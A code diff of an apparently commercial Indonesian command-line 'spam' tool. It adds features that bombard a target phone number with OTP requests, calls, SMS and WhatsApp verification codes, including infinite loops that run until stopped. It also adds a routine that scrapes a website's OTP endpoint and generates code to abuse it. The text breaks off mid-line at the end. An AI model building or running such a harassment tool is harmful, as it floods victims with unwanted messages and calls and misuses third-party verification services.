@@ -8,12 +8,13 @@ import platform
 import os
 import json
 import re
+import requests
 from datetime import datetime
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-from utils import fmt_08
+from utils import fmt_08, get_random_user_agent
 
 from license import (
     clear_screen, log_info, log_success, log_warning, log_error, log_input,
@@ -45,8 +46,9 @@ def show_buy_guide():
     print(f"  {Fore.GREEN}•{Style.RESET_ALL} Unlimited penggunaan")
     print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.YELLOW}Spam Call{Style.RESET_ALL}")
     print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.YELLOW}Spam SMS{Style.RESET_ALL}")
-    print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.YELLOW}Spam WhatsApp{Style.RESET_ALL}")
-    print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.MAGENTA}Buat API Baru{Style.RESET_ALL}")
+    print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.YELLOW}Spam WA Code{Style.RESET_ALL}")
+    print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.YELLOW}Spam Panggilan WA{Style.RESET_ALL}")
+    print(f"  {Fore.GREEN}•{Style.RESET_ALL} {Fore.MAGENTA}Buat API dari Web{Style.RESET_ALL}")
     print()
     print(f"{Fore.CYAN}Kontak Admin:{Style.RESET_ALL}")
     print(f"  WhatsApp : {Fore.GREEN}{get_whatsapp_admin()}{Style.RESET_ALL}")
@@ -80,13 +82,19 @@ def show_menu(status, quota, device_id):
         print(f"{Fore.YELLOW}PREMIUM FEATURES{Style.RESET_ALL}")
         print(f"{Fore.GREEN}[4]{Style.RESET_ALL} {Fore.YELLOW}Spam Call{Style.RESET_ALL}")
         print(f"{Fore.GREEN}[5]{Style.RESET_ALL} {Fore.YELLOW}Spam SMS{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}[6]{Style.RESET_ALL} {Fore.YELLOW}Spam WhatsApp{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[6]{Style.RESET_ALL} {Fore.YELLOW}Spam WA Code{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[C]{Style.RESET_ALL} {Fore.YELLOW}📞 Spam Panggilan WA{Style.RESET_ALL}")
         print()
-        print(f"{Fore.GREEN}[0]{Style.RESET_ALL} {Fore.RED}Spam All{Style.RESET_ALL} {Fore.WHITE}(OTP + Call + SMS + WA){Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[0]{Style.RESET_ALL} {Fore.RED}Spam All{Style.RESET_ALL} {Fore.WHITE}(1x){Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[I]{Style.RESET_ALL} {Fore.RED}♾️ Spam All Infinity{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[S]{Style.RESET_ALL} {Fore.RED}🔥 Spam All Direct{Style.RESET_ALL}")
+        print()
+        print(f"{Fore.GREEN}[K]{Style.RESET_ALL} {Fore.RED}💬 Spam Kode WA Infinity{Style.RESET_ALL}")
         print()
     
     print(f"{Fore.CYAN}TOOLS{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[9]{Style.RESET_ALL} {Fore.MAGENTA}Buat API Baru{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[W]{Style.RESET_ALL} {Fore.MAGENTA}Buat API dari Web{Style.RESET_ALL}")
     print()
     
     print(f"{Fore.CYAN}LAINNYA{Style.RESET_ALL}")
@@ -117,30 +125,27 @@ def show_thread_menu():
     return log_input("Pilih (1-10, Enter=5): ").strip() or "5"
 
 # ================================================================
-# BUAT API BARU
+# BUAT API BARU (MANUAL)
 # ================================================================
 
 def buat_api_baru():
     clear_screen()
     print()
-    print(f"{Fore.MAGENTA}BUAT API OTP BARU{Style.RESET_ALL}")
+    print(f"{Fore.MAGENTA}BUAT API OTP BARU (MANUAL){Style.RESET_ALL}")
     print()
     print(f"{Fore.CYAN}Masukkan detail API baru:{Style.RESET_ALL}")
     print()
     
-    # Nama API
-    nama = log_input("Nama API (contoh: MyAPI): ").strip()
+    nama = log_input("Nama API: ").strip()
     if not nama:
         log_error("Nama tidak boleh kosong!")
         return
     
-    # URL
     url = log_input("URL Endpoint: ").strip()
     if not url:
         log_error("URL tidak boleh kosong!")
         return
     
-    # Method
     print()
     print(f"{Fore.CYAN}Pilih Method:{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[1]{Style.RESET_ALL} POST (JSON)")
@@ -165,13 +170,11 @@ def buat_api_baru():
         content_type = "application/json"
         post_type = "json"
     
-    # Payload
     print()
     print(f"{Fore.CYAN}Payload:{Style.RESET_ALL}")
     print(f"{Fore.WHITE}Gunakan {Fore.YELLOW}{{phone}}{Fore.WHITE} untuk nomor telepon{Style.RESET_ALL}")
     print(f"{Fore.WHITE}Gunakan {Fore.YELLOW}{{rand}}{Fore.WHITE} untuk random{Style.RESET_ALL}")
     print(f"{Fore.WHITE}Gunakan {Fore.YELLOW}{{uuid}}{Fore.WHITE} untuk UUID{Style.RESET_ALL}")
-    print(f"{Fore.WHITE}Gunakan {Fore.YELLOW}{{email}}{Fore.WHITE} untuk email random{Style.RESET_ALL}")
     print()
     
     default_payload = '{"phone": "{phone}", "type": "whatsapp"}'
@@ -179,29 +182,22 @@ def buat_api_baru():
     if not payload:
         payload = default_payload
     
-    # Header (opsional)
     print()
-    header_input = log_input("Header tambahan (JSON, Enter untuk skip): ").strip()
+    header_input = log_input("Header tambahan (JSON, Enter skip): ").strip()
     if header_input:
         try:
             headers = json.loads(header_input)
         except:
             headers = {}
-            log_warning("Header tidak valid JSON, skip")
     else:
         headers = {}
     
-    # Keywords sukses
     print()
-    keywords_input = log_input("Keyword sukses (pisah koma, contoh: success,otp): ").strip()
+    keywords_input = log_input("Keyword sukses (pisah koma): ").strip()
     if keywords_input:
         success_keywords = [k.strip().lower() for k in keywords_input.split(',') if k.strip()]
     else:
         success_keywords = ['success', 'otp', 'berhasil', 'sent']
-    
-    # ================================================================
-    # GENERATE KODE API
-    # ================================================================
     
     func_name = f"send_{nama.lower().replace(' ', '_')}_otp"
     
@@ -247,7 +243,7 @@ def {func_name}(phone):
     except:
         return None
 '''
-    else:  # GET
+    else:
         code = f'''
 def {func_name}(phone):
     try:
@@ -270,10 +266,6 @@ def {func_name}(phone):
         return None
 '''
     
-    # ================================================================
-    # TAMPILKAN HASIL
-    # ================================================================
-    
     print()
     print(f"{Fore.GREEN}[+] API Baru Berhasil Dibuat!{Style.RESET_ALL}")
     print()
@@ -289,11 +281,6 @@ def {func_name}(phone):
     print(f"{Fore.CYAN}Contoh tambahkan ke ALL_HANDLERS:{Style.RESET_ALL}")
     print(f"{Fore.WHITE}    '{nama.lower()}': {func_name},{Style.RESET_ALL}")
     print()
-    input("Tekan Enter untuk kembali...")
-    
-    # ================================================================
-    # OPSI SIMPAN OTOMATIS
-    # ================================================================
     
     simpan = log_input("Simpan otomatis ke handlers.py? (y/n): ").strip().lower()
     if simpan == 'y':
@@ -305,70 +292,180 @@ def {func_name}(phone):
             log_info("Jangan lupa tambahkan ke ALL_HANDLERS")
         except Exception as e:
             log_error(f"Gagal menyimpan: {e}")
+    
+    input("Tekan Enter untuk kembali...")
 
 # ================================================================
-# SPAM ALL (OTP + CALL + SMS + WA)
+# BUAT API DARI WEB
 # ================================================================
 
-def spam_all(phone):
-    """Jalankan SEMUA spam (OTP + Call + SMS + WhatsApp)"""
+def buat_api_dari_web():
+    clear_screen()
     print()
-    log_info(f"Menjalankan SPAM ALL ke {phone}...")
+    print(f"{Fore.MAGENTA}BUAT API DARI WEB{Style.RESET_ALL}")
+    print()
+    print(f"{Fore.CYAN}Masukkan URL endpoint web yang mau dijadikan API OTP:{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}Tools akan otomatis mendeteksi struktur endpoint{Style.RESET_ALL}")
     print()
     
-    # 1. OTP Spam (Single Round)
-    log_info("1. Menjalankan OTP Spam...")
+    url = log_input("URL Endpoint (contoh: https://api.contoh.com/otp): ").strip()
+    if not url:
+        log_error("URL tidak boleh kosong!")
+        return
+    
+    print()
+    log_info(f"Mengakses {url}...")
+    
     try:
-        from main_engine import run_single_round
-        run_single_round(threads=5)
-    except Exception as e:
-        log_error(f"OTP Spam error: {e}")
-    
-    print()
-    
-    # 2. Spam Call
-    log_info("2. Menjalankan Spam Call...")
+        headers = {"User-Agent": get_random_user_agent()}
+        resp = requests.get(url, headers=headers, timeout=10)
+        status_code = resp.status_code
+        content_type = resp.headers.get('content-type', '')
+        text = resp.text[:1000] if resp.text else ""
+        
+        print()
+        print(f"{Fore.CYAN}Status{Style.RESET_ALL} : {Fore.GREEN if status_code < 400 else Fore.RED}{status_code}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}Content-Type{Style.RESET_ALL} : {Fore.WHITE}{content_type}{Style.RESET_ALL}")
+        print()
+        
+        print(f"{Fore.CYAN}Deteksi payload dari response:{Style.RESET_ALL}")
+        print()
+        
+        detected_fields = []
+        sample_payload = {}
+        
+        if 'application/json' in content_type:
+            try:
+                data = resp.json()
+                print(f"{Fore.GREEN}✓ Response JSON terdeteksi{Style.RESET_ALL}")
+                print()
+                print(f"{Fore.CYAN}Sample response:{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}{json.dumps(data, indent=2)[:500]}{Style.RESET_ALL}")
+                print()
+                
+                if isinstance(data, dict):
+                    for key in data.keys():
+                        if any(k in key.lower() for k in ['phone', 'mobile', 'msisdn', 'number', 'hp']):
+                            detected_fields.append(key)
+                            sample_payload[key] = "{phone}"
+                            print(f"{Fore.GREEN}✓ Field '{key}' terdeteksi untuk nomor telepon{Style.RESET_ALL}")
+                        elif any(k in key.lower() for k in ['type', 'channel', 'method']):
+                            detected_fields.append(key)
+                            sample_payload[key] = "whatsapp"
+                            print(f"{Fore.CYAN}• Field '{key}' = 'whatsapp'{Style.RESET_ALL}")
+                        elif any(k in key.lower() for k in ['email', 'mail']):
+                            detected_fields.append(key)
+                            sample_payload[key] = "{email}"
+                            print(f"{Fore.CYAN}• Field '{key}' = '{{email}}'{Style.RESET_ALL}")
+                print()
+                
+            except:
+                print(f"{Fore.YELLOW}! Response bukan JSON, coba deteksi HTML form{Style.RESET_ALL}")
+                
+                form_match = re.search(r'<form[^>]*>.*?</form>', text, re.DOTALL)
+                if form_match:
+                    form_html = form_match.group(0)
+                    input_fields = re.findall(r'<input[^>]*name="([^"]+)"[^>]*>', form_html)
+                    if input_fields:
+                        print(f"{Fore.GREEN}✓ HTML form terdeteksi dengan field:{Style.RESET_ALL}")
+                        for field in input_fields:
+                            if any(k in field.lower() for k in ['phone', 'mobile', 'msisdn', 'number', 'hp']):
+                                sample_payload[field] = "{phone}"
+                                print(f"{Fore.GREEN}✓ Field '{field}' = '{{phone}}'{Style.RESET_ALL}")
+                            elif any(k in field.lower() for k in ['email', 'mail']):
+                                sample_payload[field] = "{email}"
+                                print(f"{Fore.CYAN}• Field '{field}' = '{{email}}'{Style.RESET_ALL}")
+                            else:
+                                sample_payload[field] = "test"
+                                print(f"{Fore.CYAN}• Field '{field}' = 'test'{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}! Response bukan JSON, coba deteksi form{Style.RESET_ALL}")
+            form_match = re.search(r'<form[^>]*>.*?</form>', text, re.DOTALL)
+            if form_match:
+                form_html = form_match.group(0)
+                input_fields = re.findall(r'<input[^>]*name="([^"]+)"[^>]*>', form_html)
+                if input_fields:
+                    print(f"{Fore.GREEN}✓ HTML form terdeteksi:{Style.RESET_ALL}")
+                    for field in input_fields:
+                        if any(k in field.lower() for k in ['phone', 'mobile', 'msisdn', 'number', 'hp']):
+                            sample_payload[field] = "{phone}"
+                            print(f"{Fore.GREEN}✓ Field '{field}' = '{{phone}}'{Style.RESET_ALL}")
+                        else:
+                            sample_payload[field] = "test"
+                            print(f"{Fore.CYAN}• Field '{field}' = 'test'{Style.RESET_ALL}")
+        
+        if not sample_payload:
+            print(f"{Fore.YELLOW}! Tidak ada field terdeteksi, gunakan default{Style.RESET_ALL}")
+            sample_payload = {"phone": "{phone}", "type": "whatsapp"}
+        
+        print()
+        print(f"{Fore.CYAN}Payload yang akan digunakan:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{json.dumps(sample_payload, indent=2)}{Style.RESET_ALL}")
+        print()
+        
+        nama = log_input("Nama API (contoh: MyWebAPI): ").strip()
+        if not nama:
+            nama = "WebAPI"
+        
+        func_name = f"send_{nama.lower().replace(' ', '_')}_otp"
+        payload_str = json.dumps(sample_payload)
+        
+        code = f'''
+def {func_name}(phone):
     try:
-        from handlers import spam_call_all
-        success = spam_call_all(phone)
-        log_success(f"Call sent: {success} method(s)")
+        phone_plus = fmt_plus(phone)
+        url = "{url}"
+        payload = {payload_str}
+        payload = payload.replace('{{phone}}', phone_plus)
+        payload = payload.replace('{{rand}}', str(random.randint(100000,999999)))
+        payload = payload.replace('{{uuid}}', str(uuid.uuid4()))
+        payload = payload.replace('{{email}}', f"user{{random.randint(1000,9999)}}@mailnesia.com")
+        try:
+            payload = json.loads(payload)
+        except:
+            pass
+        headers = {{'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}}
+        resp = requests.post("{url}", json=payload, headers=headers, timeout=10)
+        return resp
+    except:
+        return None
+'''
+        
+        print()
+        print(f"{Fore.GREEN}[+] API dari Web Berhasil Dibuat!{Style.RESET_ALL}")
+        print()
+        print(f"{Fore.CYAN}Nama API  : {Fore.WHITE}{nama}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}Function  : {Fore.WHITE}{func_name}{Style.RESET_ALL}")
+        print()
+        print(f"{Fore.YELLOW}Kode API:{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}{code}{Style.RESET_ALL}")
+        print()
+        
+        simpan = log_input("Simpan otomatis ke handlers.py? (y/n): ").strip().lower()
+        if simpan == 'y':
+            try:
+                with open('handlers.py', 'a', encoding='utf-8') as f:
+                    f.write(code)
+                    f.write(f"\n# ===== {nama} =====\n")
+                log_success(f"API {nama} berhasil disimpan ke handlers.py")
+                log_info("Jangan lupa tambahkan ke ALL_HANDLERS")
+            except Exception as e:
+                log_error(f"Gagal menyimpan: {e}")
+        
     except Exception as e:
-        log_error(f"Call error: {e}")
+        log_error(f"Error: {e}")
     
-    print()
-    
-    # 3. Spam SMS
-    log_info("3. Menjalankan Spam SMS...")
-    try:
-        from handlers import spam_sms_all
-        success = spam_sms_all(phone)
-        log_success(f"SMS sent: {success} method(s)")
-    except Exception as e:
-        log_error(f"SMS error: {e}")
-    
-    print()
-    
-    # 4. Spam WhatsApp
-    log_info("4. Menjalankan Spam WhatsApp...")
-    try:
-        from handlers import spam_whatsapp_all
-        success = spam_whatsapp_all(phone)
-        log_success(f"WhatsApp sent: {success} method(s)")
-    except Exception as e:
-        log_error(f"WhatsApp error: {e}")
-    
-    print()
-    log_success("SPAM ALL SELESAI!")
+    input("\nTekan Enter untuk kembali...")
 
 # ================================================================
-# SPAM CALL/SMS (PREMIUM)
+# SPAM FUNCTIONS
 # ================================================================
 
 def spam_call_number(phone):
     try:
         from handlers import spam_call_all
         success = spam_call_all(phone)
-        log_success(f"Call sent: {success} method(s)")
+        log_success(f"Call: {success} method(s)")
     except Exception as e:
         log_error(f"Error: {e}")
 
@@ -376,17 +473,163 @@ def spam_sms_number(phone):
     try:
         from handlers import spam_sms_all
         success = spam_sms_all(phone)
-        log_success(f"SMS sent: {success} method(s)")
+        log_success(f"SMS: {success} method(s)")
     except Exception as e:
         log_error(f"Error: {e}")
 
-def spam_whatsapp_number(phone):
+def spam_wa_code_number(phone):
     try:
-        from handlers import spam_whatsapp_all
-        success = spam_whatsapp_all(phone)
-        log_success(f"WhatsApp sent: {success} method(s)")
+        from handlers import spam_wa_code_all
+        success = spam_wa_code_all(phone)
+        log_success(f"WA Code: {success} method(s)")
     except Exception as e:
         log_error(f"Error: {e}")
+
+def spam_wa_call(phone):
+    try:
+        phone_raw = fmt_phone_only(phone)
+        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=📞%20Call%20Me"
+        resp = requests.get(url, timeout=10)
+        if resp and resp.status_code == 200:
+            log_success("WA Call link opened!")
+        else:
+            log_error("WA Call failed")
+    except Exception as e:
+        log_error(f"WA Call error: {e}")
+
+def spam_all(phone):
+    print()
+    log_info(f"Menjalankan SPAM ALL ke {phone}...")
+    print()
+    
+    log_info("1. OTP Spam...")
+    try:
+        from main_engine import run_single_round
+        run_single_round(threads=5)
+    except Exception as e:
+        log_error(f"OTP error: {e}")
+    
+    print()
+    
+    log_info("2. Spam Call...")
+    try:
+        from handlers import spam_call_all
+        success = spam_call_all(phone)
+        log_success(f"Call: {success} method(s)")
+    except Exception as e:
+        log_error(f"Call error: {e}")
+    
+    print()
+    
+    log_info("3. Spam SMS...")
+    try:
+        from handlers import spam_sms_all
+        success = spam_sms_all(phone)
+        log_success(f"SMS: {success} method(s)")
+    except Exception as e:
+        log_error(f"SMS error: {e}")
+    
+    print()
+    
+    log_info("4. Spam WA Code...")
+    try:
+        from handlers import spam_wa_code_all
+        success = spam_wa_code_all(phone)
+        log_success(f"WA Code: {success} method(s)")
+    except Exception as e:
+        log_error(f"WA Code error: {e}")
+    
+    print()
+    
+    log_info("5. Spam Panggilan WA...")
+    spam_wa_call(phone)
+    
+    print()
+    log_success("SPAM ALL SELESAI!")
+
+# ================================================================
+# SPAM INFINITY FUNCTIONS
+# ================================================================
+
+def spam_all_infinity():
+    clear_screen()
+    print()
+    print(f"{Fore.RED}♾️ SPAM ALL INFINITY{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}Jalan terus sampai di-stop (Ctrl+C){Style.RESET_ALL}")
+    print()
+    
+    phone = log_input("Nomor target (08xx): ").strip()
+    if not phone:
+        log_error("Nomor tidak boleh kosong!")
+        return
+    
+    phone = fmt_08(phone)
+    print()
+    log_info(f"Target: {phone}")
+    log_info("Memulai SPAM ALL INFINITY...")
+    log_info("Tekan Ctrl+C untuk berhenti")
+    print()
+    
+    round_num = 1
+    try:
+        while True:
+            print()
+            log_info(f"Round {round_num} dimulai...")
+            spam_all(phone)
+            log_info(f"Round {round_num} selesai. Menunggu 10 detik...")
+            for _ in range(10):
+                time.sleep(1)
+            round_num += 1
+    except KeyboardInterrupt:
+        print()
+        log_warning("SPAM ALL INFINITY dihentikan!")
+        log_info(f"Total round: {round_num-1}")
+
+def spam_all_direct():
+    clear_screen()
+    print()
+    print(f"{Fore.RED}🔥 SPAM ALL DIRECT{Style.RESET_ALL}")
+    print()
+    
+    phone = log_input("Nomor target (08xx): ").strip()
+    if not phone:
+        log_error("Nomor tidak boleh kosong!")
+        return
+    
+    phone = fmt_08(phone)
+    spam_all(phone)
+    print()
+    input("Tekan Enter untuk kembali...")
+
+def spam_wa_code_infinity():
+    clear_screen()
+    print()
+    print(f"{Fore.RED}💬 SPAM KODE WA INFINITY{Style.RESET_ALL}")
+    print()
+    
+    phone = log_input("Nomor target (08xx): ").strip()
+    if not phone:
+        log_error("Nomor tidak boleh kosong!")
+        return
+    
+    phone = fmt_08(phone)
+    print()
+    log_info(f"Target: {phone}")
+    log_info("Memulai SPAM KODE WA INFINITY...")
+    log_info("Tekan Ctrl+C untuk berhenti")
+    print()
+    
+    count = 0
+    try:
+        while True:
+            count += 1
+            log_info(f"Round {count}...")
+            spam_wa_code_number(phone)
+            time.sleep(3)
+    except KeyboardInterrupt:
+        print()
+        log_warning("SPAM KODE WA dihentikan!")
+        log_info(f"Total round: {count}")
 
 # ================================================================
 # MAIN
@@ -404,13 +647,43 @@ def main():
         choice = log_input("Pilih menu: ").strip()
         
         # ========================================
-        # SPAM ALL (PREMIUM ONLY)
+        # SPAM ALL
         # ========================================
         if choice == "0" and status == "premium":
             phone = log_input("Nomor target (08xx): ").strip()
             if phone:
                 phone = fmt_08(phone)
                 spam_all(phone)
+            input("\nTekan Enter untuk kembali...")
+        
+        # ========================================
+        # SPAM ALL INFINITY
+        # ========================================
+        elif choice.upper() == "I" and status == "premium":
+            spam_all_infinity()
+            input("\nTekan Enter untuk kembali...")
+        
+        # ========================================
+        # SPAM ALL DIRECT
+        # ========================================
+        elif choice.upper() == "S" and status == "premium":
+            spam_all_direct()
+        
+        # ========================================
+        # SPAM KODE WA INFINITY
+        # ========================================
+        elif choice.upper() == "K" and status == "premium":
+            spam_wa_code_infinity()
+            input("\nTekan Enter untuk kembali...")
+        
+        # ========================================
+        # SPAM PANGGILAN WA
+        # ========================================
+        elif choice.upper() == "C" and status == "premium":
+            phone = log_input("Nomor target (08xx): ").strip()
+            if phone:
+                phone = fmt_08(phone)
+                spam_wa_call(phone)
             input("\nTekan Enter untuk kembali...")
         
         # ========================================
@@ -506,55 +779,17 @@ def main():
             input("\nTekan Enter untuk kembali...")
         
         # ========================================
-        # MENU 6: SPAM WHATSAPP (PREMIUM ONLY)
+        # MENU 6: SPAM WA CODE (PREMIUM ONLY)
         # ========================================
         elif choice == "6" and status == "premium":
             phone = log_input("Nomor target (08xx): ").strip()
             if phone:
                 phone = fmt_08(phone)
-                spam_whatsapp_number(phone)
+                spam_wa_code_number(phone)
             input("\nTekan Enter untuk kembali...")
         
         # ========================================
         # MENU 9: BUAT API BARU
         # ========================================
         elif choice == "9":
-            buat_api_baru()
-        
-        # ========================================
-        # MENU BELI PREMIUM (TRIAL USER)
-        # ========================================
-        elif choice == "4" and status != "premium":
-            show_buy_guide()
-            user = check_user(device_id)
-            if user:
-                quota = user.get("quota", 0)
-        
-        # ========================================
-        # MENU BELI PREMIUM (PREMIUM USER - INFO)
-        # ========================================
-        elif choice == "7" and status == "premium":
-            show_buy_guide()
-        
-        # ========================================
-        # MENU KELUAR
-        # ========================================
-        elif (choice == "5" and status != "premium") or (choice == "8" and status == "premium"):
-            print(f"\n{Fore.GREEN}Terima kasih!{Style.RESET_ALL}")
-            sys.exit(0)
-        
-        else:
-            log_warning("Pilihan tidak valid!")
-            time.sleep(1)
-
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\nDibatalkan.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\nERROR: {e}")
-        import traceback
-        traceback.print_exc()
-        sys.exit(1)
+            buat_api_bar
